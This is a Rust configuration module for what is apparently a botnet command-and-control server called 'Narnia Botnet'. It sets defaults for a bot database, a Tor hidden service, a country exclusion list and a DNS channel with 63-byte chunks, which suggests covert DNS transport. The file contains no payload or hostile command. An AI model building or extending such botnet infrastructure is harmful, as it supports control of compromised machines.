use serde::{Deserialize, Serialize};
use config::{Config, ConfigError, File};
use std::env;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Config {
    pub server: ServerConfig,
    pub database: DatabaseConfig,
    pub tor: TorConfig,
    pub dns: DnsConfig,
    pub security: SecurityConfig,
    pub logging: LoggingConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ServerConfig {
    pub host: String,
    pub port: u16,
    pub workers: usize,
    pub secret_key: String,
    pub enable_cors: bool,
    pub max_connections: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DatabaseConfig {
    pub url: String,
    pub max_connections: u32,
    pub enable_wal: bool,
    pub backup_interval_hours: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TorConfig {
    pub enabled: bool,
    pub hidden_service_port: u16,
    pub data_directory: String,
    pub contact_info: String,
    pub geoip_exclude_countries: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DnsConfig {
    pub enabled: bool,
    pub domain: String,
    pub ttl: u32,
    pub max_chunk_size: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityConfig {
    pub enable_encryption: bool,
    pub encryption_key: String,
    pub token_expiry_hours: u64,
    pub rate_limit_requests: u32,
    pub rate_limit_window_seconds: u64,
    pub allowed_ips: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LoggingConfig {
    pub level: String,
    pub file_path: String,
    pub max_file_size_mb: u64,
    pub max_files: u32,
    pub enable_console: bool,
}

impl Default for C2Config {
    fn default() -> Self {
        Self {
            server: ServerConfig::default(),
            database: DatabaseConfig::default(),
            tor: TorConfig::default(),
            dns: DnsConfig::default(),
            security: SecurityConfig::default(),
            logging: LoggingConfig::default(),
        }
    }
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            host: "127.0.0.1".to_string(),
            port: 8000,
            workers: 4,
            secret_key: "change_this_secret_key_in_production".to_string(),
            enable_cors: true,
            max_connections: 1000,
        }
    }
}

impl Default for DatabaseConfig {
    fn default() -> Self {
        Self {
            url: "botnet.db".to_string(),
            max_connections: 10,
            enable_wal: true,
            backup_interval_hours: 24,
        }
    }
}

impl Default for TorConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            hidden_service_port: 80,
            data_directory: "./tor_data".to_string(),
            contact_info: "Narnia Botnet <admin@narnia.onion>".to_string(),
            geoip_exclude_countries: vec!["US".to_string(), "CN".to_string()],
        }
    }
}

impl Default for DnsConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            domain: "botnet.example.com".to_string(),
            ttl: 300,
            max_chunk_size: 63,
        }
    }
}

impl Default for SecurityConfig {
    fn default() -> Self {
        Self {
            enable_encryption: false,
            encryption_key: "change_this_encryption_key".to_string(),
            token_expiry_hours: 24,
            rate_limit_requests: 100,
            rate_limit_window_seconds: 60,
            allowed_ips: vec![],
        }
    }
}

impl Default for LoggingConfig {
    fn default() -> Self {
        Self {
            level: "INFO".to_string(),
            file_path: "c2.log".to_string(),
            max_file_size_mb: 100,
            max_files: 5,
            enable_console: true,
        }
    }
}

impl C2Config {
    pub fn load() -> Result<Self, ConfigError> {
        // Load .env file if it exists
        dotenvy::dotenv().ok();

        let mut builder = Config::builder()
            .add_source(File::with_name("config/default").required(false))
            .add_source(File::with_name("config/c2").required(false))
            .add_source(config::Environment::with_prefix("C2"));

        // Override with environment variables
        if let Ok(port) = env::var("C2_PORT") {
            if let Ok(port_num) = port.parse::<u16>() {
                builder = builder.set_override("server.port", port_num)?;
            }
        }

        if let Ok(host) = env::var("C2_HOST") {
            builder = builder.set_override("server.host", host)?;
        }

        if let Ok(db_url) = env::var("DATABASE_URL") {
            builder = builder.set_override("database.url", db_url)?;
        }

        if let Ok(tor_enabled) = env::var("TOR_ENABLED") {
            if let Ok(enabled) = tor_enabled.parse::<bool>() {
                builder = builder.set_override("tor.enabled", enabled)?;
            }
        }

        if let Ok(dns_enabled) = env::var("DNS_ENABLED") {
            if let Ok(enabled) = dns_enabled.parse::<bool>() {
                builder = builder.set_override("dns.enabled", enabled)?;
            }
        }

        if let Ok(log_level) = env::var("LOG_LEVEL") {
            builder = builder.set_override("logging.level", log_level)?;
        }

        builder.build()?.try_deserialize()
    }

    pub fn validate(&self) -> Result<(), String> {
        // Validate server config
        if self.server.port == 0 {
            return Err("Server port cannot be 0".to_string());
        }

        if self.server.secret_key.len() < 16 {
            return Err("Secret key must be at least 16 characters".to_string());
        }

        // Validate database config
        if self.database.url.is_empty() {
            return Err("Database URL cannot be empty".to_string());
        }

        // Validate Tor config
        if self.tor.enabled {
            if self.tor.data_directory.is_empty() {
                return Err("Tor data directory cannot be empty when Tor is enabled".to_string());
            }
        }

        // Validate DNS config
        if self.dns.enabled {
            if self.dns.domain.is_empty() {
                return Err("DNS domain cannot be empty when DNS is enabled".to_string());
            }
        }

        // Validate security config
        if self.security.enable_encryption && self.security.encryption_key.len() < 16 {
            return Err("Encryption key must be at least 16 characters when encryption is enabled".to_string());
        }

        Ok(())
    }

    pub fn get_server_address(&self) -> String {
        format!("{}:{}", self.server.host, self.server.port)
    }

    pub fn is_tor_enabled(&self) -> bool {
        self.tor.enabled
    }

    pub fn is_dns_enabled(&self) -> bool {
        self.dns.enabled
    }

    pub fn is_encryption_enabled(&self) -> bool {
        self.security.enable_encryption
    }
}
